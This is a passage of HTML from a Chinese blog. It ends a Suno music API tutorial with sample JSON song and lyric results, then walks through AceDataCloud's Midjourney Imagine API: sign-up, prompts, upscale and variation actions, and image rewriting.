                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"44472ab8-783b-4054-b861-5bf14e462f60"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"da4324e5-84b2-484b-b0e9-dd261381c594"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Winter Whispers"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://cdn1.suno.ai/image_da4324e5-84b2-484b-b0e9-dd261381c594.png"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nSnow falling gently from the sky\nChildren giggling as they pass by\nFire crackling\nCozy and warm\nChristmas spirit begins to swarm\n[Verse 2]\nTwinkling lights\nA sight to behold\nStockings hung\nWaiting to be filled with gold\nGifts wrapped with love\nPiled high\nExcitement in the air\nYou can't deny\n[Chorus]\nWinter whispers in the wind\nJoy and love it brings\nLet's celebrate this season\nWith the ones we're missing"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://cdn1.suno.ai/da4324e5-84b2-484b-b0e9-dd261381c594.mp3"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://cdn1.suno.ai/da4324e5-84b2-484b-b0e9-dd261381c594.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2024-05-11T07:33:05.430Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"chirp-v3"</span>,</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"A song for Christmas"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"pop"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"b878a87b-a0db-4046-8ccd-ecd2fb3d4372"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Winter Whispers"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://cdn1.suno.ai/image_b878a87b-a0db-4046-8ccd-ecd2fb3d4372.png"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nSnow falling gently from the sky\nChildren giggling as they pass by\nFire crackling\nCozy and warm\nChristmas spirit begins to swarm\n[Verse 2]\nTwinkling lights\nA sight to behold\nStockings hung\nWaiting to be filled with gold\nGifts wrapped with love\nPiled high\nExcitement in the air\nYou can't deny\n[Chorus]\nWinter whispers in the wind\nJoy and love it brings\nLet's celebrate this season\nWith the ones we're missing"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://cdn1.suno.ai/b878a87b-a0db-4046-8ccd-ecd2fb3d4372.mp3"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://cdn1.suno.ai/b878a87b-a0db-4046-8ccd-ecd2fb3d4372.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2024-05-11T07:33:05.430Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"chirp-v3"</span>,</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"A song for Christmas"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"pop"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
                  <h2 id="歌词生成"><a href="#歌词生成" class="headerlink" title="歌词生成"></a>歌词生成</h2>
                  <p>如果你想自定义生成歌曲，但又不太想自己编写歌词，可以使用 AceDataCloud 提供的歌词生成 API 来通过 prompt 生成歌词，API 是 <a href="https://platform.acedata.cloud/documents/514d82dc-f7ab-4638-9f21-8b9275916b08" target="_blank" rel="noopener">Suno Lyrics Generation API</a>。</p>
                  <p>该 API 只有一个输入参数，就是 <code>prompt</code>，填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/p53wtj.png" alt=""></p>
                  <p>这里我们输入的 <code>prompt</code> 是 <code>A song about winter</code>，生成和冬天相关的歌曲。</p>
                  <p>点击运行，结果如下：</p>
                  <figure class="highlight tex">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  "success": true,</span><br><span class="line">  "task_id": "57e8ce3a-39cb-41a2-802f-e70a324f4d0a",</span><br><span class="line">  "data": &#123;</span><br><span class="line">    "text": "[Verse]<span class="tag">\<span class="name">nSnowflakes</span></span> falling from the sky<span class="tag">\<span class="name">nWinter</span></span>'s cold touch<span class="tag">\<span class="name">nOh</span></span> how it gets me high<span class="tag">\<span class="name">nI</span></span> bundle up in layers<span class="tag">\<span class="name">nOh</span></span> so cozy<span class="tag">\<span class="name">nStepping</span></span> out and feeling the frost on my nose<span class="tag">\<span class="name">nSee</span></span><span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name">n</span><span class="string">[Verse 2]</span></span><span class="tag">\<span class="name">nThe</span></span> world is covered in a blanket of white<span class="tag">\<span class="name">nIcicles</span></span> hanging<span class="tag">\<span class="name">nShimmering</span></span> so bright<span class="tag">\<span class="name">nThe</span></span> chilly air fills my lungs with every breath<span class="tag">\<span class="name">nWalking</span></span> in the snow<span class="tag">\<span class="name">nLeaving</span></span> footprints that won't be left<span class="tag">\<span class="name">n</span></span><span class="tag">\<span class="name">n</span><span class="string">[Chorus]</span></span><span class="tag">\<span class="name">nOh</span></span><span class="tag">\<span class="name">nWinter</span></span>'s cold touch<span class="tag">\<span class="name">nIt</span></span>'s a season that I love so much<span class="tag">\<span class="name">nSnowfall</span></span> brings a feeling so divine<span class="tag">\<span class="name">nWinter</span></span>'s cold touch<span class="tag">\<span class="name">nIt</span></span>'s a magical time",</span><br><span class="line">    "title": "Winter's Cold Touch",</span><br><span class="line">    "status": "complete"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，<code>data</code> 的 <code>text</code> 字段就是歌词信息，这个信息可以用于上文的自定义歌曲生成。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-05-30 04:46:22" itemprop="dateCreated datePublished" datetime="2024-05-30T04:46:22+08:00">2024-05-30</time>
                </span>
                <span id="/42348.html" class="post-meta-item leancloud_visitors" data-flag-title="Suno API 的申请及使用" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42347.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 人工智能 <i class="label-arrow"></i>
                  </a>
                  <a href="/42347.html" class="post-title-link" itemprop="url">Midjourney Imagine API 申请及使用</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>在人工智能绘图领域，想必大家听说过 Midjourney 的大名吧！</p>
                  <p>Midjourney 是一款非常强大的 AI 绘图工具，只要输入关键字，就能在短短一两分钟生成十分精美的图像。Midjourney 以其出色的绘图能力在业界独树一帜，如今，Midjourney 早已在各个行业和领域广泛应用，其影响力愈发显著。</p>
                  <p>然而，在国内想要使用 Midjourney 却面临着相当大的挑战。首先，Midjourney 目前驻扎在 Discord 平台中，这意味着要使用 Midjourney，必须通过特殊的充值途径获得访问权限。如果没有订阅，几乎无法使用 Midjourney，因此单是使用这一工具就成了一个巨大的难题。此外，有人或许会疑问：Midjourney 是否提供对外 API 服务？然而事实是，Midjourney 并未向外界提供任何 API 服务，而且从目前情况看来，这一情况似乎也不会改变。</p>
                  <p>那么，是否有方法能够与 Midjourney 对接，并将其融入到自己的产品中呢？</p>
                  <p>答案是肯定的。接下来，我将为大家介绍 AceDataCloud 平台所提供的 Midjourney API，通过使用该 API，我们能够实现与 Midjourney 官方完全一致的效果和操作，下文会详细介绍。</p>
                  <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2>
                  <p>AceDataCloud 是什么呢？简单来说，它是一个提供多样数字化 API 的服务平台，其官网链接是：<a href="https://platform.acedata.cloud?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">https://platform.acedata.cloud?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f</a> 。</p>
                  <p>你可能会疑惑，既然 Midjourney 官方并未向外提供 API，那么 AceDataCloud 平台的 API 是如何诞生的呢？简言之，AceDataCloud 的 Midjourney 与 Discord 内的 Midjourney Bot 进行了接口对接，同时模拟了底层通信协议，从而能够在 Discord 平台上实现与 Midjourney 官方完全相同的操作。这涵盖了文字生成图片、图像转换、图像融合、图文生成等多个功能。此外，该 API 在后台维护了大量 Midjourney 账号，通过负载均衡控制实现了高度的并发处理，比官方 Midjourney 单一账号的并发能力要更高。</p>
                  <p>总体来看，无论是在 Discord 上使用 Midjourney 提供的哪一项功能，这个 API 都能完全还原官方操作的效果和效能。</p>
                  <p>稳定性如何呢？根据我个人几个月的观察和使用经验，可以不夸张地说，Midjourney 最近的风控越来越强了，目前业界很难找到比 AceDataCloud Midjourney API 更稳定实惠的选择，这样的选择寥寥无几。</p>
                  <p>下面我们就来了解下这个 API 的申请和使用方法吧。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 Midjourney Imagine API，首先可以到 <a href="https://platform.acedata.cloud/documents/e52c028d-897a-4d51-b110-60fccbe6118d?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener" title="Midjourney Imagine API">Midjourney Imagine API</a> 页面点击「Acquire」按钮，获取请求所需要的凭证：</p>
                  <p><img src="https://cdn.acedata.cloud/nyq0xz.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>接下来就可以在界面上填写对应的内容，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/d01h9f.png" alt=""></p>
                  <p>在第一次使用该接口时，我们至少需要填写两个内容，一个是 <code>authorization</code>，直接在下拉列表里面选择即可。另一个参数是 <code>prompt</code>， <code>prompt</code> 就是我们想生成的图片描述内容，建议用英文描述，画的图会更准确效果更好，这里我们用了示例内容 <code>Lamborghini speeds inside a volcano</code>，代表要画一个兰博基尼在火山飞驰。</p>
                  <p>同时您可以注意到右侧有对应的调用代码生成，您可以复制代码直接运行，也可以直接点击「Try」按钮进行测试。</p>
                  <p><img src="https://cdn.acedata.cloud/zv3db5.png" alt=""></p>
                  <p>调用之后，我们发现返回结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1233387694839697411/1234197197067915365/36rgqit64j90qptsxnyq_Lamborghini_speeds_inside_a_volcano_id0494_f47263b6-ff92-44a3-88ee-51cf0e706aae.png?ex=662fdb36&amp;is=662e89b6&amp;hm=ca9be54907726937ed02517a13466bef2afb2825b7cda4b313de56a3c3310d0d&amp;width=1024&amp;height=1024"</span>,</span><br><span class="line">  <span class="attr">"image_width"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"image_height"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1234197197067915365"</span>,</span><br><span class="line">  <span class="attr">"raw_image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1233387694839697411/1234197197067915365/36rgqit64j90qptsxnyq_Lamborghini_speeds_inside_a_volcano_id0494_f47263b6-ff92-44a3-88ee-51cf0e706aae.png?ex=662fdb36&amp;is=662e89b6&amp;hm=ca9be54907726937ed02517a13466bef2afb2825b7cda4b313de56a3c3310d0d&amp;"</span>,</span><br><span class="line">  <span class="attr">"raw_image_width"</span>: <span class="number">2048</span>,</span><br><span class="line">  <span class="attr">"raw_image_height"</span>: <span class="number">2048</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upscale1"</span>,</span><br><span class="line">    <span class="string">"upscale2"</span>,</span><br><span class="line">    <span class="string">"upscale3"</span>,</span><br><span class="line">    <span class="string">"upscale4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"1bae3bec-3ac4-4180-a148-74ee6cb68b98"</span>,</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>返回结果一共有多个字段，介绍如下：</p>
                  <ul>
                    <li><code>task_id</code>，生成此图像任务的 ID，用于唯一标识此次图像生成任务。</li>
                    <li><code>image_id</code>，图片的唯一标识，在下次需要对图片进行变换操作时需要传此参数。</li>
                    <li><code>image_url</code>，缩略图的 URL，直接打开即可查看生成的效果。</li>
                    <li><code>image_width</code>：缩略图的像素宽度。</li>
                    <li><code>image_height</code>：缩略图的像素高度。</li>
                    <li><code>raw_image_url</code>：原图的 URL，和缩略图内容一样，但相比缩略图更加高清，加载速度会更慢一些。</li>
                    <li><code>raw_image_width</code>：原图的像素宽度。</li>
                    <li><code>raw_image_height</code>：原图的像素高度。</li>
                    <li><code>actions</code>，可以对生成的图片进行的进一步操作列表。这里一共列了 8 个，其中 <code>upscale</code> 代表放大，<code>variation</code> 代表变换。所以 <code>upscale1</code> 代表的就是对左上角第一张图片进行放大操作，<code>variation3</code> 就是代表根据左下角第三张图片进行变换操作。</li>
                  </ul>
                  <p>打开 <code>image_url</code> 或者 <code>raw_image_url</code> 所对应的链接，可以发现如图所示。</p>
                  <p><img src="https://cdn.acedata.cloud/qr2iyj.png" alt=""></p>
                  <p>可以看到，这里生成了一张 2x2 的预览图。到现在为止，第一次 API 调用就完成了。</p>
                  <h2 id="图像放大与变换"><a href="#图像放大与变换" class="headerlink" title="图像放大与变换"></a>图像放大与变换</h2>
                  <p>下面我们尝试针对当前生成的照片进行进一步的操作，比如我们觉得右上角第二张的图片还不错，但我们想进行一些变换微调，那么就可以进一步将 <code>action</code> 填写为 <code>variation2</code>，同时将 <code>image_id</code> 传递即可：</p>
                  <p><img src="https://cdn.acedata.cloud/ia7vpw.png" alt=""></p>
                  <p>这时候得到的结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1233387694839697411/1234201336543969401/36rgqit64j90qptsxnyq_Lamborghini_speeds_inside_a_volcano_id0494_10dc56a7-ec16-4bac-878e-2338f2ae5f5d.png?ex=662fdf10&amp;is=662e8d90&amp;hm=9aec96bca35ae20b6f9ab536101b9c4ea255eb6216cbf7000ac554937da071f3&amp;width=1024&amp;height=1024"</span>,</span><br><span class="line">  <span class="attr">"image_width"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"image_height"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1234201336543969401"</span>,</span><br><span class="line">  <span class="attr">"raw_image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1233387694839697411/1234201336543969401/36rgqit64j90qptsxnyq_Lamborghini_speeds_inside_a_volcano_id0494_10dc56a7-ec16-4bac-878e-2338f2ae5f5d.png?ex=662fdf10&amp;is=662e8d90&amp;hm=9aec96bca35ae20b6f9ab536101b9c4ea255eb6216cbf7000ac554937da071f3&amp;"</span>,</span><br><span class="line">  <span class="attr">"raw_image_width"</span>: <span class="number">2048</span>,</span><br><span class="line">  <span class="attr">"raw_image_height"</span>: <span class="number">2048</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upscale1"</span>,</span><br><span class="line">    <span class="string">"upscale2"</span>,</span><br><span class="line">    <span class="string">"upscale3"</span>,</span><br><span class="line">    <span class="string">"upscale4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"f4961620-1104-409f-9dc1-ba3ed15c2f4d"</span>,</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>打开 <code>image_url</code>，新生成的图片如下所示：</p>
                  <p><img src="https://cdn.acedata.cloud/4g6r09.png" alt=""></p>
                  <p>可以看到，针对上一张右上角的图片，我们再次得到了四张类似的照片。</p>
                  <p>这时候我们可以挑选其中一张进行精细化地放大操作，比如选第四张，那就可以 <code>action</code> 传入 <code>upscale4</code>，通过 <code>image_id</code> 再次传入当前图像的 ID 即可。</p>
                  <p><img src="https://cdn.acedata.cloud/jk9ohl.png" alt=""></p>
                  <blockquote>
                    <p>注意： <code>upscale</code> 操作相比 <code>variation</code> 来说，Midjourney 的耗时会更短一些。</p>
                  </blockquote>
                  <p>返回结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1233387694839697411/1234202545208033400/36rgqit64j90qptsxnyq_Lamborghini_speeds_inside_a_volcano_id0494_34edc3f5-2bd0-4f5b-a372-03270b02289b.png?ex=662fe031&amp;is=662e8eb1&amp;hm=f8006c4d33a03dfd027dffe4eb46ab0d113a4910aef07497f0b335c8998b7858&amp;width=512&amp;height=512"</span>,</span><br><span class="line">  <span class="attr">"image_width"</span>: <span class="number">512</span>,</span><br><span class="line">  <span class="attr">"image_height"</span>: <span class="number">512</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1234202545208033400"</span>,</span><br><span class="line">  <span class="attr">"raw_image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1233387694839697411/1234202545208033400/36rgqit64j90qptsxnyq_Lamborghini_speeds_inside_a_volcano_id0494_34edc3f5-2bd0-4f5b-a372-03270b02289b.png?ex=662fe031&amp;is=662e8eb1&amp;hm=f8006c4d33a03dfd027dffe4eb46ab0d113a4910aef07497f0b335c8998b7858&amp;"</span>,</span><br><span class="line">  <span class="attr">"raw_image_width"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"raw_image_height"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upscale_2x"</span>,</span><br><span class="line">    <span class="string">"upscale_4x"</span>,</span><br><span class="line">    <span class="string">"variation_subtle"</span>,</span><br><span class="line">    <span class="string">"variation_strong"</span>,</span><br><span class="line">    <span class="string">"zoom_out_2x"</span>,</span><br><span class="line">    <span class="string">"zoom_out_1_5x"</span>,</span><br><span class="line">    <span class="string">"pan_left"</span>,</span><br><span class="line">    <span class="string">"pan_right"</span>,</span><br><span class="line">    <span class="string">"pan_up"</span>,</span><br><span class="line">    <span class="string">"pan_down"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"03f62b17-a6f1-4c8e-9b4d-1fc7bd5b1180"</span>,</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 <code>image_url</code> 如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/jfndfo.png" alt=""></p>
                  <p>这样我们就成功得到了一张兰博基尼的照片。</p>
                  <p>同时注意到 <code>actions</code> 里面又包含了几个可进行的操作，介绍如下：</p>
                  <ul>
                    <li><code>upscale_2x</code>：对画面放大 2 倍，得到 2 倍高清图。</li>
                    <li><code>upscale_4x</code>：对画面放大 4 倍，得到 4 倍高清图。</li>
                    <li><code>zoom_out_2x</code>：对画面进行缩小两倍操作（周围区域填充）。</li>
                    <li><code>zoom_out_1_5x</code>：对画面进行缩小 1.5 倍操作（周围区域填充）。</li>
                    <li><code>pan_left</code>：对画面进行左偏移操作。</li>
                    <li><code>pan_right</code>：对画面进行右便宜操作。</li>
                    <li><code>pan_up</code>：对画面进行上偏移操作。</li>
                    <li><code>pan_down</code>：对画面进行下偏移操作。</li>
                  </ul>
                  <p>可以继续按照上述流程传入对应的变换指令进行连续生图操作。</p>
                  <h2 id="图像改写（垫图）"><a href="#图像改写（垫图）" class="headerlink" title="图像改写（垫图）"></a>图像改写（垫图）</h2>
                  <p>该 API 也支持图像改写，俗称垫图，我们可以输入一张图片 URL 以及需要改写的描述文字，该 API 就可以返回改写后的图片。</p>
                  <blockquote>
                    <p>注意：输入的图片 URL 需要是一张纯图片，不能是一个网页里面展示一张图片，否则无法进行图像改写。建议使用图床来上传获取图片的 URL。</p>
                  </blockquote>
                  <p>例如，我们这里有一张公路落日的图片，公路旁边有一些树木和楼房，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/mq335u.png" alt=""></p>
                  <p>现在我们想在它的基础上改写成海滩旁边，同时放一辆汽车停在路边。我们就可以构造如下的 prompt：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">https://cdn.acedata.cloud/v014oc.png an illustration of a car parked on the beach --iw 2</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，我们的 prompt 的最开头是一个 HTTPS 开头的图片链接，然后接着加一个空格，后面跟上 prompt 文字的内容。这里我们还用了额外的一些高级参数，如 <code>—iw 2</code> 来调整图片的权重。</p>
                  <p>我们可以将如上内容作为一个整体，传递给 <code>prompt</code> 字段，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/pfcoy1.png" alt=""></p>
                  <p>输出结果如下：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234427310434947145/1234539663515975690/atmateosa5693_An_illustration_of_a_car_parked_on_the_beach_id26_cc8650ec-7e4b-4685-8911-78172430d8a7.png?ex=66311a28&amp;is=662fc8a8&amp;hm=c39707a1f22bc7f12874060ea6ed58ba37c188139ccc9a13c61ed9f37e66ea74&amp;width=1456&amp;height=816"</span>,</span><br><span class="line">  <span class="string">"image_width"</span>: 1456,</span><br><span class="line">  <span class="string">"image_height"</span>: 816,</span><br><span class="line">  <span class="string">"image_id"</span>: <span class="string">"1234539663515975690"</span>,</span><br><span class="line">  <span class="string">"raw_image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234427310434947145/1234539663515975690/atmateosa5693_An_illustration_of_a_car_parked_on_the_beach_id26_cc8650ec-7e4b-4685-8911-78172430d8a7.png?ex=66311a28&amp;is=662fc8a8&amp;hm=c39707a1f22bc7f12874060ea6ed58ba37c188139ccc9a13c61ed9f37e66ea74&amp;"</span>,</span><br><span class="line">  <span class="string">"raw_image_width"</span>: 2912,</span><br><span class="line">  <span class="string">"raw_image_height"</span>: 1632,</span><br><span class="line">  <span class="string">"progress"</span>: 100,</span><br><span class="line">  <span class="string">"actions"</span>: [</span><br><span class="line">    <span class="string">"upscale1"</span>,</span><br><span class="line">    <span class="string">"upscale2"</span>,</span><br><span class="line">    <span class="string">"upscale3"</span>,</span><br><span class="line">    <span class="string">"upscale4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"task_id"</span>: <span class="string">"24a79e8b-a79d-471a-aef7-089dc0627ee8"</span>,</span><br><span class="line">  <span class="string">"success"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这时候我们就得到了如下生成的图片：</p>
                  <p><img src="https://cdn.acedata.cloud/1vwkuv.png" alt=""></p>
                  <p>可以看到，在原来的图片整体风格和构图不变的前提下，整个场景变成了海滩旁边，同时公路上还出现了汽车，这就是 Prompt with Image。</p>
                  <h2 id="图像融合"><a href="#图像融合" class="headerlink" title="图像融合"></a>图像融合</h2>
                  <p>该 API 也支持图像融合，我们可以传入多张图片，以实现不同的图片融合效果。</p>
